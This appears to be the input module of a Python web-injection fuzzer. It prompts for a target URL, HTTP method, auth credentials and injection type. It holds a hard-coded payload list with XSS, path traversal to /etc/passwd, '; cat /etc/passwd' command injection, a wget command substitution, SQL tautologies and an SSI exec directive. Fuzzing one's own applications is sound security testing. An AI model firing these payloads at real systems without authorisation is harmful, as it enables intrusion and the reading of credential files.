class Input():
    def welcome():
        print('\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\
        [*] [*] [*] [*] [*] [*] [*] [*] [*] [*] [*]\n\
        [*] [*] [*] [*] [*] FUZZERs [*] [*] [*] [*]\n\
        [*] [*] [*] [*] [*] [*] [*] [*] [*] [*] [*]\n\
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')

    def ep_options():
        end_point = input('\n[!] Please provide an endpoint\
        \n(Mark your entry Ex: http://myvulnsite.com/index.php?id=[]): ')

        return end_point

    def req_options():
        request_type = input('[!] GET, POST, PUT, DELETE? ')

        return request_type

    def auth_options():
        user = input('\n[!] Provide Basic-Auth User (leave blank if none): ')
        passwd = input('[!] Provide Basic-Auth Password (leave blank if none): ')

        return user, passwd

    def injection_options():
        injection_type = input('\n[!] What type of injection do you want?\
        (Options: SQL, Command, XSS, RCE, LDAP, Fuzzer)\
        \n-> ')

        return injection_type

    def sql_injections():
        sql_injections = ['0x200', "<script>alert('hacked')</script>", '../../etc/passwd',
            '; cat /etc/passwd', "$(`echo(wget http://google.com)`)", "' OR 'a'='a",
            '*/*', "') or (SELECT admin FROM users WHERE admin = true AND ''='",
            '<!--#exec cmd="ls ../"-->']

        return sql_injections
